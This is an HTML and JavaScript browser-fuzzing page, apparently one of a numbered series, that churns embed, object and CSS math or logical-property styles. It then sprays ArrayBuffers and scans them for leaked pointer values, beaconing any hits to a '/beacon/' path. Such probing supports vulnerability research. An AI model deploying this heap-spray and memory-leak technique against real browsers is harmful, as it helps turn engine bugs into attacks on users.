<!--
  p802: HTMLEmbedElement / HTMLObjectElement plugin state /
        CSS env() safe-area-inset / CSS calc() deep nesting /
        CSS logical properties / CSS clamp()/min()/max() residue

  HTMLEmbedElement/HTMLObjectElement: even without a real plugin,
  setting src/data/type creates C++ PluginDocument/PluginView
  attempt objects. The fallback content path allocates C++
  HTMLObjectElement::UpdateTask objects. Type negotiation
  exercises the MIME type registry.

  CSS env(): env(safe-area-inset-top) etc. read from a C++
  EnvironmentVariableMap. Each env() reference in a style property
  allocates a CSSEnvironmentVariableValue node in the CSS value tree.
  Toggling styles that use env() exercises the environment resolver.

  CSS calc(): deeply nested calc() expressions build a C++ CSSCalcValue
  tree. calc(calc(calc(...))) and min(max(clamp(...))) exercise the
  recursive parser. Each nesting level allocates CSSCalcExpressionNode
  objects from the CSS value allocator.

  CSS logical properties: margin-inline-start, padding-block-end, etc.
  resolve to physical properties via the writing mode. Setting logical
  properties with different writing modes exercises the property
  resolution cache.

  CSS clamp()/min()/max(): math functions create CSSMathValue trees
  with CSSMathMin/CSSMathMax/CSSMathClamp nodes. Complex expressions
  allocate from the CSS math evaluator pool.

  Attack angles:
  A) HTMLEmbedElement src/type churn.
  B) HTMLObjectElement data/type/fallback lifecycle.
  C) CSS env() safe-area-inset references.
  D) CSS calc() deep nesting and recursive parsing.
  E) CSS logical properties with writing mode changes.
  F) CSS clamp()/min()/max() complex math expressions.

  CRASH_CLASS: LOW (DOM elements, CSS values, no side effects)
  prior art: p799 (CSS Typed OM), p801 (Navigator/CSS rules)
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p802</title>
<script>
function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
function hex64(dv,off){
  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
  var hs=hi.toString(16),ls=lo.toString(16);
  while(ls.length<8)ls='0'+ls;
  return '0x'+hs+ls;
}
function isPtr(dv,off){
  var hi=dv.getUint32(off+4,true);
  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
}
function sprayAndScan(tag,round,sizes){
  var hits=0;
  for(var si=0;si<sizes.length;si++){
    var sz=sizes[si];
    for(var i=0;i<200;i++){
      var ab=new ArrayBuffer(sz);
      var dv=new DataView(ab);
      for(var off=0;off+8<=sz;off+=8){
        if(isPtr(dv,off)){
          hits++;
          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
        }
      }
    }
  }
  return hits;
}

window.onload=function(){
b('p802-START');

// === Section A: HTMLEmbedElement src/type churn ===
try{
  b('A-embed');
  var aHits=0;

  var mimeTypes=['application/pdf','application/x-shockwave-flash',
    'image/svg+xml','text/html','text/plain','video/mp4',
    'audio/mpeg','application/octet-stream','image/png','model/vrml'];

  for(var round=0;round<5;round++){
    (function(){
      var elements=[];

      for(var i=0;i<30;i++){
        var embed=document.createElement('embed');
        embed.width='1';
        embed.height='1';
        embed.style.display='none';

        // Set and change type/src rapidly
        for(var cycle=0;cycle<mimeTypes.length;cycle++){
          embed.type=mimeTypes[cycle];
          embed.src='data:'+mimeTypes[cycle]+',test'+i+'_'+cycle;
        }

        document.body.appendChild(embed);

        if(round===0&&i===0){
          b('A embed type='+embed.type+' src='+embed.src.substring(0,40));
        }

        elements.push(embed);
      }

      if(round===0)b('A created '+elements.length+' embeds with '+mimeTypes.length+' type changes each');

      for(var i=0;i<elements.length;i++){
        document.body.removeChild(elements[i]);
      }
      elements=null;
    })();

    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
    aHits+=sprayAndScan('A',round,[32,48,64,96,128]);
  }
  b('A-DONE hits='+aHits);
}catch(e){b('A-ERR '+e.message);}

// === Section B: HTMLObjectElement data/type/fallback lifecycle ===
try{
  b('B-object');
  var bHits=0;

  for(var round=0;round<5;round++){
    (function(){
      var elements=[];

      for(var i=0;i<25;i++){
        var obj=document.createElement('object');
        obj.width='1';
        obj.height='1';
        obj.style.display='none';

        // Add fallback content
        var fallback=document.createElement('p');
        fallback.textContent='Fallback content '+i;
        obj.appendChild(fallback);

        // Add param elements
        for(var p=0;p<5;p++){
          var param=document.createElement('param');
          param.name='param_'+p;
          param.value='value_'+i+'_'+p;
          obj.appendChild(param);
        }

        // Cycle through data/type
        for(var cycle=0;cycle<8;cycle++){
          obj.type=['text/html','image/svg+xml','application/pdf','text/plain'][cycle%4];
          obj.data='data:'+obj.type+',content'+i+'_'+cycle;

          // Check content document (will be null but exercises the check)
          try{var cd=obj.contentDocument;}catch(e){}
          try{var cw=obj.contentWindow;}catch(e){}
        }

        document.body.appendChild(obj);

        if(round===0&&i===0){
          b('B object type='+obj.type+' data='+obj.data.substring(0,40));
          b('B params='+obj.getElementsByTagName('param').length);
          b('B contentDocument='+(obj.contentDocument?'yes':'null'));
        }

        // Remove and re-add to trigger reload
        document.body.removeChild(obj);
        obj.data='';
        document.body.appendChild(obj);
        document.body.removeChild(obj);

        elements.push(obj);
      }

      if(round===0)b('B created '+elements.length+' objects with fallback+params, 8 type cycles each');
      elements=null;
    })();

    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
    bHits+=sprayAndScan('B',round,[32,48,64,96,128]);
  }
  b('B-DONE hits='+bHits);
}catch(e){b('B-ERR '+e.message);}

// === Section C: CSS env() safe-area-inset references ===
try{
  b('C-env');
  var cHits=0;

  var envVars=['safe-area-inset-top','safe-area-inset-right',
    'safe-area-inset-bottom','safe-area-inset-left'];

  for(var round=0;round<5;round++){
    (function(){
      var elements=[];

      for(var i=0;i<40;i++){
        var el=document.createElement('div');
        el.style.cssText='width:100px;height:100px;display:inline-block;';
        document.body.appendChild(el);

        // Set styles using env()
        for(var cycle=0;cycle<8;cycle++){
          var envVar=envVars[cycle%envVars.length];
          var fallback=(10+cycle*5)+'px';

          el.style.paddingTop='env('+envVar+', '+fallback+')';
          el.style.paddingRight='env('+envVars[(cycle+1)%4]+', '+(5+cycle)+'px)';
          el.style.marginLeft='env('+envVars[(cycle+2)%4]+', '+(15+cycle)+'px)';
          el.style.marginBottom='env('+envVars[(cycle+3)%4]+', '+(20+cycle)+'px)';

          // Nested env in calc
          el.style.width='calc(100px + env('+envVar+', 0px))';
          el.style.height='calc(50px + env('+envVars[(cycle+1)%4]+', 0px) + env('+envVars[(cycle+2)%4]+', 0px))';

          var h=el.offsetHeight;
          var w=el.offsetWidth;
        }

        if(round===0&&i===0){
          var cs=getComputedStyle(el);
          b('C env padding-top='+cs.paddingTop+' margin-left='+cs.marginLeft);
          b('C env width='+cs.width+' height='+cs.height);
        }

        // Reset
        el.style.cssText='';
        elements.push(el);
      }

      if(round===0)b('C set env() on '+elements.length+' elements, 8 cycles each with nested calc+env');

      for(var i=0;i<elements.length;i++){
        document.body.removeChild(elements[i]);
      }
      elements=null;
    })();

    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
    cHits+=sprayAndScan('C',round,[32,48,64,96]);
  }
  b('C-DONE hits='+cHits);
}catch(e){b('C-ERR '+e.message);}

// === Section D: CSS calc() deep nesting and recursive parsing ===
try{
  b('D-calc');
  var dHits=0;

  for(var round=0;round<5;round++){
    (function(){
      var elements=[];

      for(var i=0;i<30;i++){
        var el=document.createElement('div');
        el.style.display='inline-block';
        document.body.appendChild(el);

        // Build increasingly nested calc expressions
        for(var depth=1;depth<=10;depth++){
          var expr='10px';
          for(var d=0;d<depth;d++){
            expr='calc('+expr+' + '+(d+1)+'px)';
          }
          el.style.width=expr;
          el.style.height=expr;
          var h=el.offsetHeight;
        }

        // Mixed unit calc
        el.style.width='calc(50% - 20px + 2em)';
        el.style.height='calc(100px * 0.8 + 10px / 2)';
        el.style.padding='calc(1em + 5px) calc(2% + 3px)';
        el.style.margin='calc(10px + 1vw) calc(5px + 0.5vh)';
        var h=el.offsetHeight;

        // Complex nested min/max/calc
        el.style.width='calc(min(100px, 50%) + max(10px, 2em))';
        el.style.height='calc(100px - clamp(10px, 5%, 50px))';
        h=el.offsetHeight;

        if(round===0&&i===0){
          var cs=getComputedStyle(el);
          b('D calc width='+cs.width+' height='+cs.height);
          b('D calc padding='+cs.padding+' margin='+cs.margin);
        }

        elements.push(el);
      }

      if(round===0)b('D applied deep calc() on '+elements.length+' elements, depth 1-10 + mixed units');

      for(var i=0;i<elements.length;i++){
        document.body.removeChild(elements[i]);
      }
      elements=null;
    })();

    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
    dHits+=sprayAndScan('D',round,[32,48,64,96,128]);
  }
  b('D-DONE hits='+dHits);
}catch(e){b('D-ERR '+e.message);}

// === Section E: CSS logical properties with writing mode changes ===
try{
  b('E-logical');
  var eHits=0;

  var writingModes=['horizontal-tb','vertical-rl','vertical-lr'];
  var directions=['ltr','rtl'];

  for(var round=0;round<5;round++){
    (function(){
      var elements=[];

      for(var i=0;i<35;i++){
        var el=document.createElement('div');
        el.style.cssText='display:inline-block;width:60px;height:60px;background:#ccc;';
        document.body.appendChild(el);

        // Cycle through writing modes and directions
        for(var wm=0;wm<writingModes.length;wm++){
          for(var dir=0;dir<directions.length;dir++){
            el.style.writingMode=writingModes[wm];
            el.style.direction=directions[dir];

            // Set logical properties
            el.style.marginInlineStart=(5+wm*3)+'px';
            el.style.marginInlineEnd=(8+wm*2)+'px';
            el.style.marginBlockStart=(3+dir*4)+'px';
            el.style.marginBlockEnd=(6+dir*2)+'px';
            el.style.paddingInlineStart=(4+wm)+'px';
            el.style.paddingInlineEnd=(7+wm)+'px';
            el.style.paddingBlockStart=(2+dir)+'px';
            el.style.paddingBlockEnd=(5+dir)+'px';
            el.style.borderInlineStartWidth=(1+wm)+'px';
            el.style.borderInlineEndWidth=(2+wm)+'px';
            el.style.insetInlineStart=(10+i)+'px';
            el.style.insetBlockStart=(20+i)+'px';
            el.style.inlineSize=(40+wm*5)+'px';
            el.style.blockSize=(50+dir*10)+'px';

            var h=el.offsetHeight;
            var w=el.offsetWidth;
          }
        }

        if(round===0&&i===0){
          var cs=getComputedStyle(el);
          b('E logical writingMode='+cs.writingMode+' direction='+cs.direction);
          b('E marginInlineStart='+cs.marginInlineStart+' paddingBlockEnd='+cs.paddingBlockEnd);
        }

        elements.push(el);
      }

      if(round===0)b('E toggled logical properties on '+elements.length+' elements across '+writingModes.length+'x'+directions.length+' modes');

      for(var i=0;i<elements.length;i++){
        document.body.removeChild(elements[i]);
      }
      elements=null;
    })();

    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
    eHits+=sprayAndScan('E',round,[32,48,64,96]);
  }
  b('E-DONE hits='+eHits);
}catch(e){b('E-ERR '+e.message);}

// === Section F: CSS clamp()/min()/max() complex math expressions ===
try{
  b('F-mathfn');
  var fHits=0;

  for(var round=0;round<5;round++){
    (function(){
      var elements=[];

      var mathExprs=[
        'clamp(10px, 50%, 200px)',
        'min(100px, 50%, 20em)',
        'max(10px, 5%, 2em)',
        'clamp(1rem, 2vw + 1rem, 3rem)',
        'min(max(10px, 5%), 100px)',
        'max(min(200px, 80%), 50px)',
        'clamp(10px, calc(50% - 20px), calc(100% - 40px))',
        'min(100px, max(50px, calc(25% + 10px)))',
        'calc(clamp(10px, 50%, 200px) + min(20px, 3em))',
        'max(clamp(5px, 2%, 30px), min(40px, 8%))',
        'calc(min(100px, 50%) * 2 + max(10px, 1em))',
        'clamp(0px, calc(100% - min(50px, 20%)), max(200px, 80%))'
      ];

      for(var i=0;i<30;i++){
        var el=document.createElement('div');
        el.style.display='inline-block';
        el.style.background='#ddd';
        document.body.appendChild(el);

        // Apply each math expression
        for(var ei=0;ei<mathExprs.length;ei++){
          el.style.width=mathExprs[ei];
          el.style.height=mathExprs[(ei+3)%mathExprs.length];
          el.style.padding=mathExprs[(ei+6)%mathExprs.length];
          el.style.fontSize=mathExprs[(ei+1)%mathExprs.length];
          var h=el.offsetHeight;
        }

        if(round===0&&i===0){
          var cs=getComputedStyle(el);
          b('F math width='+cs.width+' height='+cs.height);
          b('F math padding='+cs.padding+' fontSize='+cs.fontSize);
        }

        elements.push(el);
      }

      if(round===0)b('F applied '+mathExprs.length+' math expressions on '+elements.length+' elements');

      for(var i=0;i<elements.length;i++){
        document.body.removeChild(elements[i]);
      }
      elements=null;
    })();

    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
    fHits+=sprayAndScan('F',round,[32,48,64,96,128]);
  }
  b('F-DONE hits='+fHits);
}catch(e){b('F-ERR '+e.message);}

b('p802-COMPLETE');
};
</script>
</head>
